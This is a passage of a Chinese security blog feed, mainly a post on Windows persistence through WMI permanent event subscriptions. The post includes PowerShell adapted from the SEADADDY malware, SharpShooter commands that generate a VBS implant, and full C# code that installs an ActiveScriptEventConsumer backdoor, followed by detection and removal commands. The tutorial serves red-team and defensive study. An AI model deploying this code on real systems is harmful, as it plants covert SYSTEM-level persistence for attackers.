，经过破解后获得明文口令。</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-2017" target="_blank" rel="noopener">为报表服务器注册服务主体名称 (SPN)</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken.-ctor?view=netframework-4.8" target="_blank" rel="noopener">KerberosRequestorSecurityToken(String)</a><br><a href="https://www.anquanke.com/post/id/161781#h3-8" target="_blank" rel="noopener">从 Kekeo 到 Rubeus</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">域渗透——Kerberoasting</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;Kerberos&lt;/code&gt; 与 &lt;code&gt;SPN&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【权限维持】WMIC 事件订阅</title>
    <link href="https://rcoil.me/2019/05/%E3%80%90%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E3%80%91WMIC%20%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/"/>
    <id>https://rcoil.me/2019/05/【权限维持】WMIC 事件订阅/</id>
    <published>2019-05-30T12:52:59.000Z</published>
    <updated>2019-10-31T15:27:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第三次说明。</p><p>与之前的文章不同，这个操作需要管理员权限。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在日常中，使用 <code>WMI</code> 都是用于信息的收集，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list <span class="comment">#获取补丁信息</span></span><br><span class="line">wmic startup list brief <span class="comment"># 启动的程序</span></span><br><span class="line">wmic startup list full <span class="comment"># 自启动的程序</span></span><br><span class="line">wmic process <span class="keyword">call</span> <span class="keyword">create</span> <span class="string">"calc.exe"</span> <span class="comment"># 在当前机器中执行指定程序</span></span><br><span class="line">wmic process <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'*.exe'</span> <span class="keyword">list</span> <span class="keyword">full</span>   <span class="comment">#查询某个进程所对应某个具体的可执行程序是什么</span></span><br><span class="line">wmic process <span class="keyword">where</span>(description=<span class="string">"rundll32.exe"</span>) <span class="comment"># 查看rundll32所加载的dll</span></span><br><span class="line">wmic cpu <span class="keyword">get</span> DataWidth /<span class="keyword">format</span>:<span class="keyword">list</span> <span class="comment"># 查询当前机器的操作系统位数</span></span><br><span class="line">wmic <span class="keyword">share</span>  <span class="keyword">get</span> <span class="keyword">name</span>,<span class="keyword">path</span>,<span class="keyword">status</span>  <span class="comment">#利用wmic查找共享</span></span><br><span class="line">wmic logicaldisk <span class="keyword">where</span> drivetype=<span class="number">3</span> <span class="keyword">get</span> <span class="keyword">name</span>,freespace,systemname,filesystem,volumeserialnumber,<span class="keyword">size</span> <span class="comment">#查看分区</span></span><br></pre></td></tr></table></figure><p>但其实它的功能还有很多，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防病毒检测</span><br><span class="line">代码执行</span><br><span class="line">横向移动</span><br><span class="line">持久化</span><br><span class="line">盗取数据</span><br></pre></td></tr></table></figure><p>这里就针对持久化进行说明 。</p><h2 id="0x01-查询-WMI"><a href="#0x01-查询-WMI" class="headerlink" title="0x01 查询 WMI"></a>0x01 查询 WMI</h2><p><code>WMI</code> 提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即 <code>WQL</code> （类似 SQL的查询语言）。WQL查询通常可以分为以下几类：</p><ul><li>Instance Queries（实例查询）：查询WMI对象实例。</li><li>Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。</li><li>Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。</li></ul><h3 id="1-1-Instance-Queries"><a href="#1-1-Instance-Queries" class="headerlink" title="1.1 Instance Queries"></a>1.1 Instance Queries</h3><p>这是最常用的WQL查询。基本的格式如下：<br><code>SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p><ul><li>下面的查询语句将返回所有可执行文件名中带有 <code>chrome</code> 的正在运行的进程：<br><code>SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot;</code></li></ul><h3 id="1-2-Event-Queries"><a href="#1-2-Event-Queries" class="headerlink" title="1.2 Event Queries"></a>1.2 Event Queries</h3><p>事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是 <code>intrinsic</code>（系统自带的）还是 <code>extrinsic</code>（第三方的），查询语句格式不同：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [INTRINSIC <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] <span class="keyword">WITHIN</span> [POLLING <span class="built_in">INTERVAL</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [EXTRINSIC <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br></pre></td></tr></table></figure><ul><li><p>用于登陆时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> __InstanceCreationEvent <span class="keyword">WITHIN</span> <span class="number">15</span> <span class="keyword">WHERE</span> TargetInstanceISA <span class="string">'Win32_LogonSession'</span> <span class="keyword">AND</span> TargetInstance.LogonType=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>每次用户在插入可移除设备时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Win32_VolumeChangeEvent <span class="keyword">Where</span> EventType=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>每次创建 win32 进程时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">From</span> __InstanceCreationEvent <span class="keyword">Where</span> TargetInstance Isa <span class="string">"Win32_Process"</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="1-3-Meta-Queries"><a href="#1-3-Meta-Queries" class="headerlink" title="1.3 Meta Queries"></a>1.3 Meta Queries</h3><p>元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。</p><ul><li><p>格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [Meta_Class | <span class="keyword">SYSTEM</span> <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br></pre></td></tr></table></figure></li><li><p>下面这个语句会查询所有以 <code>WIN32</code> 开头的WMI的类：<br><code>SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot;</code></p></li><li>下面这个语句会查询某个命名空间下的所有命名空间：<br><code>SELECT Name FROM __NAMESPACE</code></li></ul><p>注意，当不显示的指定命名空间时，默认的命名空间为<code>ROOT\CIMV2</code>。</p><h2 id="0x02-与WMI交互"><a href="#0x02-与WMI交互" class="headerlink" title="0x02 与WMI交互"></a>0x02 与WMI交互</h2><p>Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。</p><p>下面是部分工具的一个不完全的列表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、PowerShell</span><br><span class="line">2、wmic.exe</span><br><span class="line">3、wbemtest.exe</span><br><span class="line">4、WMI Explorer</span><br><span class="line">5、CIM Studio</span><br><span class="line">6、Windows<span class="built_in"> Script </span>Host (WSH) languages</span><br><span class="line">7、C/C++ via IWbem* COM API</span><br><span class="line">8、.NET using System.Management classes</span><br><span class="line">9、winrm.exe</span><br></pre></td></tr></table></figure><h2 id="0x03-WMI事件"><a href="#0x03-WMI事件" class="headerlink" title="0x03 WMI事件"></a>0x03 WMI事件</h2><p>WMI事件分两类，包括<code>本地事件</code>（运行在本地上下文环境当中的单个进程的事件）和<code>永久性WMI事件订阅</code>。</p><p>本地事件有生命周期为进程宿主的周期，而永久性 WMI事件 是存储在WMI库中，以 SYSTEM 权限运行，并且重启后依然存在。</p><h3 id="3-1-前置条件"><a href="#3-1-前置条件" class="headerlink" title="3.1 前置条件"></a>3.1 前置条件</h3><p>为了能够安装一个<code>永久性的 WMI 事件订阅</code>，必须满足两个条件：</p><ul><li>一个 <code>__EventFilter</code> 查询，它创建一个过滤器，为我们的特定事件选择触发器;</li><li><a href="https://docs.microsoft.com/en-gb/windows/desktop/WmiSdk/standard-consumer-classes" target="_blank" rel="noopener">Event Consumer Class</a>，代表一个事件触发时所执行的操作。</li></ul><p>在 <code>Event Consumers</code>（事件处理）中，可用的标准事件处理类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogFileEventConsumer： 将事件数据写入到指定的日志文件</span><br><span class="line">ActiveScriptEventConsumer： 用来执行VBScript/JScript程序</span><br><span class="line">NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</span><br><span class="line">SMTPEventConsumer：将事件数据用邮件发送</span><br><span class="line">CommandLineEventConsumer：执行一条命令</span><br></pre></td></tr></table></figure></p><p>利用点</p><ul><li><code>ActiveScriptEventConsumer</code>，允许执行任意脚本（支持 <code>JScript</code> 和 <code>VBScript</code> 引擎）</li><li><code>CommandLineEventConsumer</code>，允许执行任意命令</li></ul><h3 id="3-2-测试"><a href="#3-2-测试" class="headerlink" title="3.2 测试"></a>3.2 测试</h3><p>使用以下查询进行测试：</p><p><code>Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot;</code></p><p>为了方便测试，此处使用 <code>Powershell 的 Register-WMIEvent</code> 安装触发器。</p><p><img src="/image/【权限维持】WMIC 事件订阅/blog_2019-05-30_11-42-33.png" alt="blog_2019-05-30_11-42-33"></p><p>以上测试不符合实际需求。</p><h3 id="3-3-Powershell-实例（命令执行）"><a href="#3-3-Powershell-实例（命令执行）" class="headerlink" title="3.3 Powershell 实例（命令执行）"></a>3.3 Powershell 实例（命令执行）</h3><p>下面的 <code>PowerShell</code> 代码来自一个叫 <code>SEADADDY</code> 的恶意软件的修改版，用来通过<code>WMI做持久化</code>的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilterName</span> = <span class="string">'BotFilter11'</span></span><br><span class="line"><span class="variable">$EventConsumerName</span> = <span class="string">'BotConsumer22'</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$EventFilterArgs</span> = @&#123;</span><br><span class="line">EventNamespace = <span class="string">'root\cimv2'</span></span><br><span class="line">Name = <span class="variable">$EventFilterName</span></span><br><span class="line">Query = <span class="string">'Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"'</span></span><br><span class="line">QueryLanguage=<span class="string">"WQL"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -NameSpace <span class="string">'root\subscription'</span> -Class __EventFilter -Arguments <span class="variable">$EventFilterArgs</span> -ErrorAction Stop</span><br><span class="line"></span><br><span class="line"><span class="variable">$CommandLineumerArgs</span> =@&#123;</span><br><span class="line">        Name=<span class="variable">$EventConsumerName</span></span><br><span class="line">CommandLineTemplate=<span class="string">'C:\Windows\System32\calc.exe'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class CommandLineEventConsumer -Arguments <span class="variable">$CommandLineumerArgs</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilterToConsumerArgs</span> = @&#123;</span><br><span class="line"><span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span></span><br><span class="line">Consumer=<span class="variable">$WMIEventConsumer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class __FilterToConsumerBinding -Arguments <span class="variable">$WMIEventFilterToConsumerArgs</span></span><br></pre></td></tr></table></figure><p>但是这里实测失败，就算使用<code>C#</code>去添加 <code>CommandLineEventConsumer</code> 也是失败的，但是 <code>LogFileEventConsumer</code> 可成功。</p><h3 id="3-4-C-实例（代码执行）"><a href="#3-4-C-实例（代码执行）" class="headerlink" title="3.4 C# 实例（代码执行）"></a>3.4 C# 实例（代码执行）</h3><p>本示例执行的是 <code>VBScript</code></p><p>使用<code>SharpShooter</code>生成 <code>VBSceipt</code> 类型的 <code>payload</code>。<em>友情提示：一定要生成 64位的 payload。</em></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; python SharpShooter.py --stageless --dotnetver <span class="number">2</span> --payload vbs --output implantvbs --rawscfile payload64.bin</span><br><span class="line"></span><br><span class="line">       _____ __                    _____ __                __           </span><br><span class="line">      <span class="regexp">/ ___/</span><span class="regexp">/ /</span>_  ____ __________ <span class="regexp">/ ___/</span><span class="regexp">/ /</span>_  ____  ____  <span class="regexp">/ /</span>____  _____</span><br><span class="line">      \__ \<span class="regexp">/ __ \/</span> __ `<span class="regexp">/ ___/</span> __ \__ \<span class="regexp">/ __ \/</span> __ \<span class="regexp">/ __ \/</span> __<span class="regexp">/ _ \/</span> ___/</span><br><span class="line">     ___<span class="regexp">/ /</span> <span class="regexp">/ /</span> <span class="regexp">/ /</span>_<span class="regexp">/ /</span> <span class="regexp">/  /</span> <span class="regexp">/_/</span> <span class="regexp">/__/</span> <span class="regexp">/ /</span> <span class="regexp">/ /</span> <span class="regexp">/_/</span> <span class="regexp">/ /</span>_<span class="regexp">/ /</span> <span class="regexp">/_/</span>  __<span class="regexp">/ /</span>    </span><br><span class="line">    <span class="regexp">/____/</span>_<span class="regexp">/ /</span>_<span class="regexp">/\__,_/</span>_<span class="regexp">/  /</span> .___<span class="regexp">/____/</span>_<span class="regexp">/ /</span>_<span class="regexp">/\____/\_</span>___<span class="regexp">/\__/\_</span>__<span class="regexp">/_/</span>     </span><br><span class="line">                         <span class="regexp">/_/</span>                                            </span><br><span class="line"></span><br><span class="line">     Dominic Chell, <span class="meta">@domchell</span>, MDSec ActiveBreach, v2<span class="number">.0</span></span><br><span class="line">    </span><br><span class="line">[*] Written delivery payload to output/implantvbs.vbs</span><br><span class="line">运行vbs，成功上线，再进行 base64 编码</span><br><span class="line">&gt; base64 -i output/implantvbs.vbs &gt;&gt;implantvbs-base64.txt</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// WMI Event Subscription Peristence Demo</span><br><span class="line">// Author: @domchell</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Management;</span><br><span class="line"></span><br><span class="line">namespace WMIPersistence</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            PersistWMI();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void PersistWMI()</span><br><span class="line">        &#123;</span><br><span class="line">            ManagementObject myEventFilter = null;</span><br><span class="line">            ManagementObject myEventConsumer = null;</span><br><span class="line">            ManagementObject myBinder = null;</span><br><span class="line"></span><br><span class="line">            string vbscript64 = &quot;&lt;INSIDE base64 encoded VBS here&gt;&quot;;</span><br><span class="line">            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                ManagementScope scope = new ManagementScope(@&quot;\\.\root\subscription&quot;);</span><br><span class="line"></span><br><span class="line">                ManagementClass wmiEventFilter = new ManagementClass(scope, new</span><br><span class="line">                ManagementPath(&quot;__EventFilter&quot;), null);</span><br><span class="line">                String strQuery = @&quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 &quot; +            </span><br><span class="line">        &quot;WHERE TargetInstance ISA \&quot;Win32_Process\&quot; &quot; +           </span><br><span class="line">        &quot;AND TargetInstance.Name = \&quot;notepad.exe\&quot;&quot;;</span><br><span class="line"></span><br><span class="line">                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);</span><br><span class="line">                myEventFilter = wmiEventFilter.CreateInstance();</span><br><span class="line">                myEventFilter[&quot;Name&quot;] = &quot;demoEventFilter&quot;;</span><br><span class="line">                myEventFilter[&quot;Query&quot;] = myEventQuery.QueryString;</span><br><span class="line">                myEventFilter[&quot;QueryLanguage&quot;] = myEventQuery.QueryLanguage;</span><br><span class="line">                myEventFilter[&quot;EventNameSpace&quot;] = @&quot;\root\cimv2&quot;;</span><br><span class="line">                myEventFilter.Put();</span><br><span class="line">                Console.WriteLine(&quot;[*] Event filter created.&quot;);</span><br><span class="line"></span><br><span class="line">                myEventConsumer =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;ActiveScriptEventConsumer&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myEventConsumer[&quot;Name&quot;] = &quot;BadActiveScriptEventConsumer&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptingEngine&quot;] = &quot;VBScript&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptText&quot;] = vbscript;</span><br><span class="line">                myEventConsumer.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Event consumer created.&quot;);</span><br><span class="line"></span><br><span class="line">                myBinder =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;__FilterToConsumerBinding&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myBinder[&quot;Filter&quot;] = myEventFilter.Path.RelativePath;</span><br><span class="line">                myBinder[&quot;Consumer&quot;] = myEventConsumer.Path.RelativePath;</span><br><span class="line">                myBinder.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Subscription created&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e);</span><br><span class="line">            &#125; // END CATCH</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125; // END FUNC</span><br><span class="line">    &#125; // END CLASS</span><br><span class="line">&#125; // END NAMESPACE</span><br></pre></td></tr></table></figure><p>管理员权限运行生成的exe，<strong>演示 GIF</strong></p><p><img src="/image/【权限维持】WMIC 事件订阅/blog_2019-05-29_11-42-33.gif" alt="blog_2019-05-29_11-42-33"></p><h2 id="0x04-WMI后门检测及清除"><a href="#0x04-WMI后门检测及清除" class="headerlink" title="0x04 WMI后门检测及清除"></a>0x04 WMI后门检测及清除</h2><h3 id="4-1-Sysmon日志"><a href="#4-1-Sysmon日志" class="headerlink" title="4.1 Sysmon日志"></a>4.1 Sysmon日志</h3><p>略….</p><h3 id="4-2-查看当前WMI-Event"><a href="#4-2-查看当前WMI-Event" class="headerlink" title="4.2 查看当前WMI Event"></a>4.2 查看当前WMI Event</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#List Event Filters</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventFilter</span><br><span class="line"></span><br><span class="line"><span class="meta">#List Event Consumers</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventConsumer</span><br><span class="line"></span><br><span class="line"><span class="meta">#List Event Bindings</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __FilterToConsumerBinding</span><br></pre></td></tr></table></figure><h3 id="4-3-清除后门"><a href="#4-3-清除后门" class="headerlink" title="4.3 清除后门"></a>4.3 清除后门</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#Filter</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventFilter -Filter <span class="string">"Name='BotFilter82'"</span> | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line"><span class="meta">#Consumer</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> CommandLineEventConsumer -Filter <span class="string">"Name='BotConsumer23'"</span> | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line"><span class="meta">#Binding</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Filter <span class="string">"__Path LIKE '%BotFilter82%'"</span> | Remove-WmiObject -Verbose</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event Subscription</a><br><a href="https://wooyun.x10sec.org/static/drops/tips-8189.html" target="_blank" rel="noopener">WMI Attacks</a><br><a href="https://4hou.win/wordpress/?p=17080" target="_blank" rel="noopener">利用WMI构建无文件后门（基础篇）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第三次说明。&lt;/p&gt;
&lt;p&gt;与之前的文章不同，这个操作需要管理员权限。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>【权限维持】Microsoft Office</title>
    <link href="https://rcoil.me/2019/05/%E3%80%90%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E3%80%91Microsoft%20Office/"/>
    <id>https://rcoil.me/2019/05/【权限维持】Microsoft Office/</id>
    <published>2019-05-29T10:52:59.000Z</published>
    <updated>2019-10-31T15:26:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第一次说明。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间有过个需求，判断 <code>Office</code>是否开启宏，索性将 <a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a> 中有关 <code>Office</code> 的记录也在后文写一下。</p><ul><li>判断是否安装了 <code>Microsoft Office</code></li><li>判断是否开启了 <code>宏</code></li><li>相关利用</li></ul><h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows <span class="number">7</span> Ultimate x64</span><br><span class="line">- Office <span class="number">2007</span>（实际环境）</span><br><span class="line">- Office <span class="number">2010</span>（测试环境）</span><br><span class="line">- Office <span class="number">2013</span>（测试环境）</span><br><span class="line">- Office <span class="number">2016</span>（测试环境）</span><br></pre></td></tr></table></figure><h2 id="0x02-相关判断"><a href="#0x02-相关判断" class="headerlink" title="0x02 相关判断"></a>0x02 